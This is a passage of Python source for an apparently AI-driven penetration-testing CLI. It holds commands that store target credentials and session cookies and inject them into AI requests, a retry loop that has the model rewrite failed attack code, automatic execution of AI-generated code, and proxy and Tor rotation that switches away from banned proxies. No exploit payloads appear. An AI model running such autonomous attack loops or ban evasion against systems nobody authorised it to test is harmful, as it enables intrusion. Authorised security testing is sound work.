                "zh": "用法: /load <会话文件路径>\n例) /load ~/.config/bingo/sessions/session_20260629_134027.md",
                "en": "Usage: /load <session-file-path>\nEx)   /load ~/.config/bingo/sessions/session_20260629_134027.md",
            }.get(_lang, "Usage: /load <path>")
            self._warn(_usage)
            return

        ok = self._load_session_from_file(path_str)
        if not ok:
            return

        # 복원 후 AI에게 자동 재개 요청
        from ..models.registry import ModelRegistry
        model_cfg = self.config.get_active_model_config()
        if not model_cfg:
            self._warn(self.s["no_model_configured"])
            return

        _target = getattr(self, "_current_target", "")
        _auto_msg = {
            "ko": f"위 대화 내용을 확인했습니다. 이전 작업에서 어디까지 진행됐는지 간략히 요약하고, 다음 단계를 이어서 진행해 주세요.{' 타겟: ' + _target if _target else ''}",
            "zh": f"已确认上述对话内容。请简要总结之前的进度，并继续下一步工作。{' 目标: ' + _target if _target else ''}",
            "en": f"I've loaded the previous session. Please briefly summarize progress so far and continue with the next step.{' Target: ' + _target if _target else ''}",
        }.get(_lang, "Continue from the loaded session.")

        self.history.append(Message(role="user", content=_auto_msg))
        self._append_to_session_log("user", _auto_msg)
        model = ModelRegistry.build(model_cfg)
        response = self._stream_response(
            model.chat_stream(self._build_messages(""))
        )
        if response:
            self.history.append(Message(role="assistant", content=response))
            self._append_to_session_log("assistant", response)
            self._execute_ai_commands(response)

    # ── /report ───────────────────────────────────────────────────────
    def _cmd_proof_report(self, arg: str) -> None:
        """
        /report       — 현재 세션 Proof-by-exploitation 리포트 출력
        /report save  — 파일 저장
        /report clear — 초기화
        """
        cmd = arg.strip().lower()
        target = getattr(self, "_current_target", "unknown")

        if cmd == "clear":
            from ..core.vuln_agents import ProofReport
            self._proof_report = ProofReport()
            self.console.print(
                f"[{THEME['success']}]{self.s.get('report_cleared', '리포트 초기화 완료')}[/]"
            )
            return

        md = self._proof_report.generate_markdown(target)

        if cmd == "save":
            import time
            fname = f"proof_report_{target.replace('://', '_').replace('/', '_')}_{int(time.time())}.md"
            Path(fname).write_text(md, encoding="utf-8")
            self.console.print(
                f"[{THEME['success']}]{self.s.get('report_saved', '리포트 저장됨')}: {fname}[/]"
            )
        else:
            from rich.markdown import Markdown
            self.console.print(Markdown(md))

    def _cmd_help(self) -> None:
        self.console.print(
            Panel(
                self.s["help_text"],
                title=f"[{THEME['primary']}]BINGO COMMANDS[/]",
                border_style=THEME["primary"],
            )
        )

    def _cmd_clear(self) -> None:
        self._clear()
        self._print_banner()

    def _cmd_quit(self) -> None:
        self.console.print(f"[{THEME['primary']}]{self.s['goodbye']}[/]")
        # ── v3.2.72: /exit, /quit 명령으로 종료 시에도 세션 파싱 ──
        self._auto_parse_session_to_memory()
        sys.exit(0)

    # ── /login <url> <username> <password> ───────────────────────────
    def _cmd_login(self, arg: str) -> None:
        """실제 HTTP 로그인을 수행하고 세션 쿠키를 저장한다."""
        parts = arg.split()
        if len(parts) < 3:
            self._warn(
                self.s.get(
                    "login_usage",
                    "사용법: /login <url> <username> <password>\n"
                    "예) /login https://target.com/manager/login.asp admin admin123",
                )
            )
            return

        url, username, password = parts[0], parts[1], parts[2]

        from ..tools.login_executor import LoginExecutor

        def _log(msg: str):
            self.console.print(f"[{THEME['dim']}]{msg}[/]")

        executor = LoginExecutor(on_log=_log)
        result = executor.login(url, username, password)

        if result.success:
            # 세션 저장
            self._auth_session.update({
                "login_url": url,
                "username": username,
                "password": password,
                "cookies": result.cookies,
                "evidence": result.evidence,
                "active": True,
            })
            # v6.2.169: 세션 하트비트 시작 — 쿠키 만료 방지 (5분 간격)
            _hb_target = self._agent_state.get("target", "") or url
            self._start_session_heartbeat(_hb_target, interval=300)
            self.console.print(
                f"\n[{THEME['success']}]{result.message}[/]"
            )
            if result.cookies:
                self.console.print(
                    f"[{THEME['accent']}]{self.s.get('session_cookies_saved', 'Session cookies saved:')}[/] "
                    f"[white]{'; '.join(f'{k}={v}' for k, v in result.cookies.items())}[/]"
                )
            self.console.print(
                f"[{THEME['dim']}]{self.s.get('session_cookie_injected', 'Session cookies will be auto-injected into all AI requests.')}[/]\n"
            )
            self._add_to_log(
                "system",
                f"[LOGIN SUCCESS] {url} | {username} | evidence={result.evidence} | "
                f"cookies={result.cookies}",
            )
        else:
            self.console.print(f"\n[{THEME['error']}]{result.message}[/]\n")
            self._warn(
                self.s.get(
                    "login_failed_tip",
                    "직접 브라우저로 로그인해서 쿠키를 확인하고 /cred 명령어로 수동 입력하세요.",
                )
            )

    # ── /cred <username> <password> [cookie=value ...] ───────────────
    def _cmd_cred(self, arg: str) -> None:
        """자격증명만 저장 (로그인 없이). 쿠키를 직접 지정할 수도 있다."""
        parts = arg.split()
        if not parts:
            # 현재 저장된 자격증명 표시
            if self._auth_session.get("active"):
                self.console.print(
                    f"[{THEME['accent']}]{self.s.get('cred_saved_label', 'Saved credentials:')}[/]\n"
                    f"  URL: {self._auth_session['login_url'] or '(N/A)'}\n"
                    f"  ID: {self._auth_session['username']}\n"
                    f"  PW: {'*' * len(self._auth_session['password'])}\n"
                    f"  Cookie: {self._auth_session['cookies']}\n"
                    f"  Evidence: {self._auth_session['evidence']}"
                )
            else:
                self._info(self.s.get("cred_none", "저장된 자격증명이 없습니다."))
            return

        if len(parts) < 2:
            self._warn(
                self.s.get(
                    "cred_usage",
                    "사용법: /cred <username> <password> [COOKIE_NAME=value ...]\n"
                    "예) /cred admin admin123\n"
                    "예) /cred admin admin123 SESSIONID=abc123",
                )
            )
            return

        username, password = parts[0], parts[1]
        extra_cookies: dict[str, str] = {}
        for token in parts[2:]:
            if "=" in token:
                k, v = token.split("=", 1)
                extra_cookies[k] = v

        self._auth_session.update({
            "login_url": self._auth_session.get("login_url", ""),
            "username": username,
            "password": password,
            "cookies": extra_cookies,
            "evidence": "MANUAL",
            "active": True,
        })
        # v6.2.169: 수동 쿠키 저장 시에도 하트비트 시작
        if extra_cookies:
            _hb_target = self._agent_state.get("target", "") or self._auth_session.get("login_url", "")
            if _hb_target:
                self._start_session_heartbeat(_hb_target, interval=300)
        self.console.print(
            f"[{THEME['success']}]{self.s.get('cred_saved_ok', '✅ Credentials saved')}[/]\n"
            f"  ID: {username}  PW: {'*' * len(password)}"
        )
        if extra_cookies:
            self.console.print(f"  Cookie: {extra_cookies}")
        self.console.print(
            f"[{THEME['dim']}]{self.s.get('cred_auto_use', 'These credentials will be auto-used in AI requests.')}[/]\n"
        )

    # ── /session — 현재 인증 세션 상태 확인 / 초기화 ─────────────────
    def _cmd_session(self) -> None:
        """현재 인증 세션 상태를 출력하거나 초기화한다."""
        if self._auth_session.get("active"):
            self.console.print(
                f"\n[{THEME['accent']}]{self.s.get('session_active_label', '🔐 Active Session')}[/]\n"
                f"{self.s.get('session_login_url_label', '  Login URL  : ')}{self._auth_session['login_url'] or '(N/A)'}\n"
                f"  ID         : {self._auth_session['username']}\n"
                f"  PW         : {'*' * len(self._auth_session['password'])}\n"
                f"{self.s.get('session_evidence_label', '  Evidence   : ')}[{THEME['success']}]{self._auth_session['evidence']}[/]\n"
                f"{self.s.get('session_cookie_label', '  Cookies    : ')}{self._auth_session['cookies']}\n"
            )
            self.console.print(
                f"[{THEME['dim']}]{self.s.get('session_clear_hint', 'Reset session: /session clear')}[/]"
            )
        else:
            self._info(self.s.get("session_no_active", "No active session. Use /login or /cred to set a session."))

    # ────────────────────────────────────────────────────────────────
    # /hint 명령어 — 실행 루프 실행 중이 아닐 때도 다음 AI 호출에 힌트 삽입
    # ────────────────────────────────────────────────────────────────
    def _cmd_hint(self, hint_text: str) -> None:
        """/hint <메시지> — 다음 AI 응답에 사용자 힌트를 즉시 주입한다.
        실행 루프 중 Ctrl+C 없이도 방향 전환 가능.
        """
        _lang = getattr(self.config, "lang", "en")
        if not hint_text.strip():
            _usage = {
                "ko": "사용법: /hint <메시지>  예) /hint 캡차 우회하지 말고 다른 경로 시도해",
                "zh": "用法: /hint <消息>  例) /hint 不要绕过验证码，试试其他路径",
                "en": "Usage: /hint <message>  e.g. /hint skip captcha, try other endpoints",
            }.get(_lang, "Usage: /hint <message>")
            self._warn(_usage)
            return

        _hint_label = {
            "ko": f"[사용자 힌트 — 즉시 반영]: {hint_text}",
            "zh": f"[用户提示 — 立即应用]: {hint_text}",
            "en": f"[USER HINT — apply immediately]: {hint_text}",
        }.get(_lang, f"[USER HINT]: {hint_text}")

        self.history.append(Message(role="user", content=_hint_label))

        _ok = {
            "ko": f"💬 힌트가 다음 AI 호출에 주입됩니다: {hint_text[:50]}",
            "zh": f"💬 提示已注入下一次AI调用: {hint_text[:50]}",
            "en": f"💬 Hint injected into next AI call: {hint_text[:50]}",
        }.get(_lang, f"💬 Hint injected: {hint_text[:50]}")
        self._success(_ok)

        # 즉시 AI에게 힌트를 전달하고 응답받기
        model_cfg = self.config.get_active_model_config()
        if model_cfg:
            from ..models.registry import ModelRegistry as _MR
            _m = _MR.build(model_cfg)
            resp = self._stream_response(_m.chat_stream(self._build_messages("")))
            if resp:
                self.history.append(Message(role="assistant", content=resp))
                self._append_to_session_log("assistant", resp)

    # ────────────────────────────────────────────────────────────────
    # /retry — 마지막 실패 단계 재실행
    # ────────────────────────────────────────────────────────────────
    def _cmd_retry(self) -> None:
        """/retry — 마지막 실행 결과를 AI에게 다시 보내 재시도 지시."""
        _lang = getattr(self.config, "lang", "en")
        last = getattr(self, "_last_exec_result", "")
        if not last:
            _no_result = {
                "ko": "⚠ 재시도할 이전 실행 결과가 없습니다. 먼저 작업을 실행하세요.",
                "zh": "⚠ 没有可重试的上次执行结果。请先运行任务。",
                "en": "⚠ No previous execution result to retry. Run a task first.",
            }.get(_lang, "⚠ No previous result to retry.")
            self._warn(_no_result)
            return

        _retry_msg = {
            "ko": (
                "[RETRY 요청]\n"
                "아래 실행 결과에서 실패한 부분을 분석하고, "
                "다른 접근법으로 재시도하는 코드를 작성하세요.\n"
                "처음부터 다시 시작하지 말고 실패 원인만 수정하세요.\n\n"
                f"=== 마지막 실행 결과 ===\n{last[:2000]}\n=== END ==="
            ),
            "zh": (
                "[重试请求]\n"
                "分析以下执行结果中的失败部分，"
                "编写使用不同方法重试的代码。\n"
                "不要从头开始，只修复失败原因。\n\n"
                f"=== 上次执行结果 ===\n{last[:2000]}\n=== END ==="
            ),
            "en": (
                "[RETRY REQUEST]\n"
                "Analyze the failure in the result below and write code "
                "that retries with a different approach.\n"
                "Do NOT restart from scratch — fix only what failed.\n\n"
                f"=== Last Execution Result ===\n{last[:2000]}\n=== END ==="
            ),
        }.get(_lang, f"[RETRY] Fix what failed:\n{last[:2000]}")

        self.history.append(Message(role="user", content=_retry_msg))

        _banner = {
            "ko": "🔁 마지막 실패 단계 재시도 중...",
            "zh": "🔁 正在重试上次失败步骤...",
            "en": "🔁 Retrying last failed step...",
        }.get(_lang, "🔁 Retrying...")
        self.console.print(f"[{THEME['warn']}]{_banner}[/]\n")

        model_cfg = self.config.get_active_model_config()
        if model_cfg:
            from ..models.registry import ModelRegistry as _MR
            _m = _MR.build(model_cfg)
            resp = self._stream_response(_m.chat_stream(self._build_messages("")))
            if resp:
                self.history.append(Message(role="assistant", content=resp))
                self._append_to_session_log("assistant", resp)
                # 새 코드 블록이 있으면 바로 실행
                self._execute_ai_commands(resp)

    # ────────────────────────────────────────────────────────────────
    # 알림 — 작업 완료 / 크리티컬 취약점 발견 시
    # ────────────────────────────────────────────────────────────────
    def _send_notification(self, title: str, message: str, critical: bool = False) -> None:
        """macOS 시스템 알림 + 터미널 벨 소리."""
        import subprocess, sys
        # 터미널 벨
        print("\a", end="", flush=True)
        # macOS 알림
        if sys.platform == "darwin":
            try:
                sound = "Basso" if critical else "Glass"
                script = (
                    f'display notification "{message}" '
                    f'with title "{title}" '
                    f'sound name "{sound}"'
                )
                subprocess.run(
                    ["osascript", "-e", script],
                    capture_output=True, timeout=3,
                )
            except Exception:
                pass

    # ── 자연어 자격증명 자동 파싱 ────────────────────────────────────
    def _try_natural_language_login(self, text: str) -> None:
        """
        사용자가 자연어로 자격증명을 제공했을 때 자동으로 세션에 저장.
        예) "아이디는 admin이고 비번은 1234야"
            "id: admin, pw: pass123"
            "admin / pass123 로 로그인해줘"
        로그인 URL 이 있으면 /login 을 자동 실행, 없으면 /cred 에 저장.
        """
        import re as _re
        t = text.strip()

        # 로그인 의도 감지 키워드
        login_intent = any(kw in t for kw in [
            "로그인", "login", "로그인해", "접속해", "들어가", "로그인 해줘",
            "로그인해줘", "로그인 해", "접속",
        ])
        cred_intent = any(kw in t for kw in [
            "아이디", "id:", "ID:", "비번", "비밀번호", "password:", "pw:", "PW:",
            "passwd:", "계정", "account",
        ])

        if not (login_intent or cred_intent):
            return

        # username 추출 패턴
        user_patterns = [
            r'아이디[는은이가\s]*[:：]?\s*["\']?(\S+?)["\']?[\s,이고이야。\.]',
            r'id\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'(?:user|username|userid)\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'["\']?(\S+?)["\']?\s*/\s*["\']?(\S+?)["\']?\s+(?:로|으로|로그인)',
            r'(?:계정|아이디)\s+["\']?(\w+)["\']?',
        ]
        # password 추출 패턴
        pass_patterns = [
            r'비번[은는이가\s]*[:：]?\s*["\']?(\S+?)["\']?[\s,이고이야。\.]',
            r'비밀번호[는은이가\s]*[:：]?\s*["\']?(\S+?)["\']?[\s,이고이야。\.]',
            r'pw\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'password\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'passwd\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
        ]

        username = None
        password = None

        for pat in user_patterns:
            m = _re.search(pat, t, _re.IGNORECASE)
            if m:
                username = m.group(1).strip("'\",.!?")
                break

        for pat in pass_patterns:
            m = _re.search(pat, t, _re.IGNORECASE)
            if m:
                password = m.group(1).strip("'\",.!?")
                break

        if not (username and password):
            return  # 파싱 실패 → AI에게 그냥 전달

        # URL 추출
        url_m = _re.search(r'https?://\S+', t)
        url = url_m.group(0).rstrip(",.") if url_m else self._auth_session.get("login_url", "")

        if url and login_intent:
            self.console.print(
                f"[{THEME['dim']}]{self.s.get('cred_auto_login', '🔍 Credentials detected → auto-running /login')}[/]\n"
                f"   URL: {url}  ID: {username}  PW: {'*' * len(password)}"
            )
            self._cmd_login(f"{url} {username} {password}")
        elif username and password:
            self.console.print(
                f"[{THEME['dim']}]{self.s.get('cred_auto_save', '🔍 Credentials detected → saved to /cred (URL not detected)')}[/]\n"
                f"   ID: {username}  PW: {'*' * len(password)}"
            )
            self._cmd_cred(f"{username} {password}")

    def _on_proxy_switched(self, old_entry, new_entry, reason: str) -> None:
        """프록시 교체 시 콘솔 알림 (v3.2.80)."""
        _old_str = str(old_entry) if old_entry else "—"
        _new_str = str(new_entry)
        _key = "proxy_switch_ban" if reason == "ban" else "proxy_switch_rotate"
        _tpl = self.s.get(_key, "🔄 Proxy switched → {new}")
        if isinstance(_tpl, dict):
            _lang = getattr(self.config, "lang", "en")
            _tpl = _tpl.get(_lang, _tpl.get("en", "🔄 Proxy switched → {new}"))
        msg = _tpl.format(old=_old_str, new=_new_str)
        self.console.print(f"\n[{THEME['success']}]{msg}[/]\n")

    def _cmd_history(self) -> None:
        if not self.history:
            self._info(self.s["history_empty"])
            return
        for i, m in enumerate(self.history, 1):
            color = THEME["accent"] if m.role == "user" else THEME["secondary"]
            label = self.s["you"] if m.role == "user" else "bingo"
            preview = m.content[:120].replace("\n", " ")
            self.console.print(f"[{color}]{i:3}. {label}[/] — {preview}")

    def _cmd_export(self) -> None:
        if not self.history:
            self._info(self.s["history_empty"])
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = Path.cwd() / f"bingo_chat_{ts}.md"
        lines = [f"# Bingo Chat — {ts}\n"]
        for m in self.history:
            label = self.s["you"] if m.role == "user" else "bingo"
            lines.append(f"## {label}\n{m.content}\n")
        path.write_text("\n".join(lines), encoding="utf-8")
        self._success(f"{self.s['export_saved']}: {path}")

    def _cmd_config(self) -> None:
        table = Table(
            title=f"[{THEME['primary']}]{self.s['config_view']}[/]",
            border_style=THEME["primary"],
            show_header=True,
        )
        table.add_column("Key", style=THEME["secondary"])
        table.add_column("Value", style="white")
        table.add_row("lang", self.config.lang)
        table.add_row("active_model", self.config.active_model or "—")
        table.add_row("models", str(len(self.config.models)))
        self.console.print(table)

    def _safe_prompt_ask(
        self,
        prompt: str,
        *,
        password: bool = False,
        fallback: str = "",
        attempts: int = 2,
    ) -> str:
        """Prompt for terminal input without crashing on broken stdin bytes."""
        lang = getattr(self.config, "lang", "en")
        msg = {
            "ko": "입력 인코딩 오류가 감지되었습니다. 현재 입력은 무시하고 다시 입력하세요.",
            "zh": "检测到输入编码错误。已忽略当前输入，请重新输入。",
            "en": "Input encoding error detected. Current input was ignored; please enter it again.",
        }.get(lang, "Input encoding error detected. Please enter it again.")
        for _ in range(max(1, attempts)):
            try:
                return Prompt.ask(prompt, password=password).strip()
            except UnicodeDecodeError:
                self.console.print(f"[{THEME['warn']}]⚠ {msg}[/]")
        return fallback

    def _cmd_lang(self) -> None:
        self.console.print(f"\n[{THEME['primary']}]{self.s['select_lang']}[/]")
        lang_list = list(SUPPORTED_LANGS.items())  # [("ko","한국어"), ("zh","中文"), ("en","English")]
        for i, (code, label) in enumerate(lang_list, 1):
            self.console.print(f"  [{THEME['secondary']}]{i}[/] — {label}  [{THEME['dim']}]({code})[/]")
        self.console.print()

        # 번호(1/2/3) 또는 코드(ko/zh/en) 둘 다 허용
        raw = self._safe_prompt_ask(
            f"[{THEME['primary']}][ko/zh/en/1/2/3][/]",
        ).lower()

        # 번호 입력 시 코드로 변환
        num_map = {str(i + 1): code for i, (code, _label) in enumerate(lang_list)}
        lang = num_map.get(raw, raw)

        if lang not in SUPPORTED_LANGS:
            self._warn(self.s["lang_invalid"].format(raw=raw))
            return

        # 설정 저장 + strings 갱신 (v6.2.178: 들여쓰기 버그 수정 — 이전엔 if블록 안 unreachable)
        self.config.lang = lang
        self.config.save()
        self.s = get_strings(lang)

        # 전역 i18n 동기화
        try:
            from ..i18n import set_lang as _set_lang
            _set_lang(lang)
        except Exception:
            pass
        try:
            from ..tools_ext.pentest_tools import set_notice_lang as _snl
            _snl(lang)
        except Exception:
            pass

        self._success(self.s["lang_saved"])
        self.console.print(
            f"  [{THEME['dim']}]{self.s['lang_changed'].format(lang=SUPPORTED_LANGS[lang])}[/]"
        )

    def _cmd_model(self) -> None:
        from ..models.registry import BUILTIN_PROVIDERS, get_provider_label
        from ..models.base import ModelConfig

        _lang = getattr(self.config, "lang", "en")
        _delete_hint = {
            "ko": "삭제: d번호 / del 번호  예) d3",
            "zh": "删除: d编号 / del 编号  例) d3",
            "en": "Delete: d<number> / del <number>  e.g. d3",
        }.get(_lang, "Delete: d<number> / del <number>  e.g. d3")
        _deleted_msg = {
            "ko": "모델이 삭제되었습니다: {name}",
            "zh": "模型已删除: {name}",
            "en": "Model deleted: {name}",
        }.get(_lang, "Model deleted: {name}")
        _delete_invalid_msg = {
            "ko": "삭제할 저장 모델 번호가 올바르지 않습니다: {raw}",
            "zh": "要删除的已保存模型编号无效: {raw}",
            "en": "Invalid saved-model number to delete: {raw}",
        }.get(_lang, "Invalid saved-model number to delete: {raw}")

        self.console.print(f"\n[{THEME['primary']}]{self.s['select_model']}[/]\n")

        # 기존 모델 목록
        if self.config.models:
            self.console.print(f"  [{THEME['secondary']}]{self.s['models_saved']}[/]")
            for i, m in enumerate(self.config.models, 1):
                mark = "✓" if m.display_name() == self.config.active_model else " "
                self.console.print(f"  [{THEME['primary']}]{mark} {i}[/] — {m.display_name()}")
            self.console.print(f"  [{THEME['dim']}]{_delete_hint}[/]")
            self.console.print()

        # 신규 추가
        providers = list(BUILTIN_PROVIDERS.items())
        self.console.print(f"  [{THEME['secondary']}]{self.s['models_add_new']}[/]")
        for i, (pid, info) in enumerate(providers, len(self.config.models) + 1):
            # v3.2.89: 언어별 레이블 사용
            _lbl = get_provider_label(info, _lang)
            self.console.print(f"  [{THEME['dim']}]{i}[/] — {_lbl}")

        raw = self._safe_prompt_ask(f"\n[{THEME['primary']}]{self.s['select_number']}[/]")
        raw_norm = raw.strip()
        raw_lower = raw_norm.lower()

        # 저장된 모델 삭제: d3 / del 3 / delete 3 / remove 3 / rm 3
        delete_token = ""
        if raw_lower.startswith("d") and raw_lower[1:].strip().isdigit():
            delete_token = raw_lower[1:].strip()
        else:
            for prefix in ("del ", "delete ", "remove ", "rm ", "삭제 ", "删除 "):
                if raw_lower.startswith(prefix):
                    delete_token = raw_lower[len(prefix):].strip()
                    break
        if delete_token:
            try:
                delete_idx = int(delete_token) - 1
            except ValueError:
                delete_idx = -1
            if 0 <= delete_idx < len(self.config.models):
                removed = self.config.models.pop(delete_idx)
                removed_name = removed.display_name()
                if not self.config.models:
                    self.config.active_model = ""
                elif not any(
                    m.display_name() == self.config.active_model or m.alias == self.config.active_model
                    for m in self.config.models
                ):
                    self.config.active_model = self.config.models[0].display_name()
                self.config.save()
                self._success(_deleted_msg.format(name=removed_name))
            else:
                self._warn(_delete_invalid_msg.format(raw=raw_norm))
            return

        try:
            idx = int(raw_norm) - 1
        except ValueError:
            return

        # 기존 모델 전환
        if 0 <= idx < len(self.config.models):
            self.config.active_model = self.config.models[idx].display_name()
            self.config.save()
            self._success(self.s["model_saved"])
            return

        # 신규 등록
        new_idx = idx - len(self.config.models)
        if 0 <= new_idx < len(providers):
            pid, info = providers[new_idx]
            _lbl = get_provider_label(info, _lang)
            api_key = self._safe_prompt_ask(
                f"[{THEME['primary']}]{_lbl} {self.s['enter_api_key']}[/]",
                password=True,
            )
            default_url = info["base_url"]
            url_input = self._safe_prompt_ask(
                f"[{THEME['primary']}]{self.s['enter_base_url']}[/] [{THEME['dim']}]({default_url})[/]",
            )
            base_url = url_input or default_url

            default_model = info["default_model"]
            model_input = self._safe_prompt_ask(
                f"[{THEME['primary']}]{self.s['model_name_prompt']}[/] [{THEME['dim']}]({default_model})[/]",
            )
            model_name = model_input or default_model

            alias = self._safe_prompt_ask(
                f"[{THEME['primary']}]{self.s['alias_prompt']}[/]",
            )

            if pid == "custom" and (not base_url or not model_name):
                self._warn("Custom model requires Base URL and model name.")
                return

            cfg = ModelConfig(
                provider=pid,
                model=model_name,
                api_key=api_key,
                base_url=base_url,
                alias=alias or "",
            )
            self.config.add_model(cfg)
            self.config.active_model = cfg.display_name()
            self.config.save()
            self._success(self.s["model_saved"])

    # ── 롤백 / 비용 명령어 ────────────────────────────────────────

    def _cmd_undo(self, steps: int = 1) -> None:
        """N단계 전 상태로 롤백."""
        snap = self._rollback.undo(steps)
        if not snap:
            self.console.print(f"[{THEME['warn']}]⚠ {self.s.get('undo_none', 'No snapshots')}[/]")
            return
        import copy
        self._agent_state = copy.deepcopy(snap.agent_state)
        self._save_agent_state()
        # 히스토리를 스냅샷 시점으로 되돌리기
        if snap.history_len < len(self.history):
            self.history = self.history[:snap.history_len]
        from rich.panel import Panel as _P
        self.console.print(_P(
            f"[green]✅ {self.s.get('undo_done', 'Rollback complete')}[/green]\n"
            f"[bold]{snap.label}[/bold]  ({snap.timestamp_str})\n"
            f"DB: {snap.agent_state.get('db_name', 'N/A')}  "
            f"Tables: {snap.agent_state.get('tables', [])}",
            title="[bold]UNDO[/bold]",
            border_style="green",
            expand=False,
        ))

    def _cmd_snapshots(self) -> None:
        """저장된 스냅샷 목록 출력."""
        from rich.table import Table as _T
        snaps = self._rollback.list_snapshots()
        if not snaps:
            self.console.print(f"[{THEME['dim']}]{self.s.get('snapshots_empty', 'No saved snapshots')}[/]")
            return
        t = _T(title="[bold]Snapshots[/bold]", border_style="cyan")
        t.add_column("#",     width=3)
        t.add_column(self.s.get("snap_col_time", "Time"),  width=10)
        t.add_column(self.s.get("snap_col_label", "Label"))
        t.add_column("DB",    width=20)
        for i, s in enumerate(snaps):
            t.add_row(
                str(i+1),
                s.timestamp_str,
                s.label,
                s.agent_state.get("db_name") or "-",
            )
        self.console.print(t)
        self.console.print(f"[{THEME['dim']}]{self.s.get('undo_hint', '/undo 1 — go back 1 step')}[/]")

    def _cmd_cost(self) -> None:
        """현재 세션 토큰/비용 출력."""
        from rich.panel import Panel as _P
        u = self._token_usage
        self.console.print(_P(
            f"[cyan]Prompt tokens:[/cyan]     {u['prompt']:,}\n"
            f"[cyan]Completion tokens:[/cyan] {u['completion']:,}\n"
            f"[cyan]Total tokens:[/cyan]      {u['total']:,}\n"
            f"[bold yellow]Est. cost:[/bold yellow]         ${self._cost_usd:.4f}",
            title="[bold]Token Usage[/bold]",
            border_style="cyan",
            expand=False,
        ))

    # ── /proxy 명령어 핸들러 (v3.2.18) ──────────────────────────────
    def _cmd_proxy(self, arg: str) -> None:
        """
        프록시 풀 로테이션 관리.

        사용법:
          /proxy list          — 현재 풀 상태 표시
          /proxy add <url>     — 프록시 수동 추가 (세션 간 저장됨)
          /proxy file <path>   — 파일에서 일괄 로드 (~, $HOME 자동 확장)
          /proxy api [url]     — API에서 자동 수집
          /proxy tor [pass]    — Tor 모드 활성화 (pass: 제어 비밀번호, 선택)
          /proxy rotate        — 즉시 다음 프록시로 전환
          /proxy test          — 현재 프록시 연결 확인
          /proxy testall       — 풀 전체 프록시 일괄 연결 테스트
          /proxy unban         — 밴된 프록시 전부 해제
          /proxy clear         — 풀 초기화 (저장된 설정도 삭제)
          /proxy off           — 프록시 비활성화
        
        v3.2.77: 프록시 설정 세션 간 자동 저장/복원 (~/.config/bingo/proxy_pool.json)
        """
        from rich.table import Table as _Table
        pm = self._proxy
        parts = arg.split(None, 1)
        sub = parts[0].lower() if parts else "list"
        sub_arg = parts[1].strip() if len(parts) > 1 else ""

        _lang = getattr(self.config, "lang", "en")

        # ─ list ──────────────────────────────────────────────────────
        if sub in ("", "list", "status"):
            st = pm.pool_status()
            s = self.s
            tbl = _Table(title="🌐 Proxy Pool Status", border_style="cyan", expand=False)
            tbl.add_column(s.get("proxy_list_col_item", "항목"), style="cyan")
            tbl.add_column(s.get("proxy_list_col_value", "값"), style="white")
            _inst = s.get("proxy_list_installed", "✅ 설치됨")
            tbl.add_row(s.get("proxy_list_enabled", "활성화"),
                        "✅ ON" if st["enabled"] else "❌ OFF")
            tbl.add_row(s.get("proxy_list_total", "총 프록시"), str(st["total"]))
            tbl.add_row(s.get("proxy_list_active", "사용 가능"), str(st["active"]))
            tbl.add_row(s.get("proxy_list_banned", "밴됨"), str(st["banned"]))
            tbl.add_row(s.get("proxy_list_current", "현재 프록시"), st["current"])
            tbl.add_row(s.get("proxy_list_tor", "Tor 모드"), "✅" if st["tor"] else "❌")
            tbl.add_row(s.get("proxy_list_stem", "stem (Tor 회로 교체)"),
                        _inst if st["stem"] else "❌ pip install stem")
            tbl.add_row(s.get("proxy_list_pysocks", "PySocks (SOCKS5)"),
                        _inst if st["pysocks"] else "❌ pip install PySocks")
            self.console.print(tbl)

            items = pm.list_all()
            if items:
                ptbl = _Table(border_style="dim", expand=False)
                ptbl.add_column("#", style="dim")
                ptbl.add_column(s.get("proxy_list_col_proxy", "프록시"), style="cyan")
                ptbl.add_column(s.get("proxy_list_col_status", "상태"), style="white")
                ptbl.add_column(s.get("proxy_list_col_success", "성공"), justify="right")
                ptbl.add_column(s.get("proxy_list_col_fail", "실패"), justify="right")
                ptbl.add_column(s.get("proxy_list_col_latency", "지연(ms)"), justify="right")
                for i, e in enumerate(items, 1):
                    status = "[red]BANNED[/]" if e["banned"] else "[green]OK[/]"
                    if e["is_tor"]:
                        status = "[magenta]TOR[/]"
                    lat = f"{e['latency']:.0f}" if e["latency"] >= 0 else "-"
                    ptbl.add_row(str(i), e["url"], status,
                                 str(e["success"]), str(e["fails"]), lat)
                self.console.print(ptbl)
            return

        # ─ add ───────────────────────────────────────────────────────
        if sub == "add":
            if not sub_arg:
                self._warn(self.s.get("proxy_add_usage",
                    "사용법: /proxy add <url>\n"
                    "예시:   /proxy add socks5://1.2.3.4:1080\n"
                    "        /proxy add http://user:pass@5.6.7.8:3128\n"
                    "        /proxy add https://9.10.11.12:443"))
                return
            ok = pm.add(sub_arg)
            if ok:
                self._success(
                    self.s.get("proxy_added", "✅ 프록시 추가됨: {url}").format(url=sub_arg)
                )
                pm.save_config()  # v3.2.77: 세션 간 저장
            else:
                self._warn(
                    self.s.get("proxy_add_fail", "❌ 추가 실패 (중복 또는 형식 오류): {url}").format(url=sub_arg)
                )
            return

        # ─ file ──────────────────────────────────────────────────────
        if sub == "file":
            if not sub_arg:
                self._warn(self.s.get("proxy_file_usage",
                    "사용법: /proxy file <파일경로>   (한 줄에 프록시 1개)"))
                return
            import os as _os
            real_path = _os.path.expandvars(_os.path.expanduser(sub_arg.strip()))
            if not _os.path.isfile(real_path):
                self._warn(
                    self.s.get(
                        "proxy_file_not_found",
                        "❌ 파일을 찾을 수 없습니다: {path}",
                    ).format(path=real_path)
                )
                return
            n = pm.load_file(real_path)
            if n == 0:
                self._warn(
                    self.s.get(
                        "proxy_file_empty",
                        "⚠ 파일에서 유효한 프록시를 찾지 못했습니다: {path}",
                    ).format(path=real_path)
                )
            else:
                self._success(
                    self.s.get("proxy_file_loaded", "📂 파일에서 {n}개 프록시 로드됨").format(n=n)
                )
                pm.save_config()  # v3.2.77: 세션 간 저장
            return

        # ─ api ───────────────────────────────────────────────────────
        if sub == "api":
            if sub_arg:
                # URL 직접 지정
                with self.console.status("[cyan]🌐 ...[/cyan]"):
                    n = pm.fetch_from_api(sub_arg)
                self._success(
                    self.s.get("proxy_api_fetched", "🌐 API에서 {n}개 프록시 수집됨").format(n=n)
                )
            else:
                # 프리셋 선택
                presets = pm.free_api_urls()
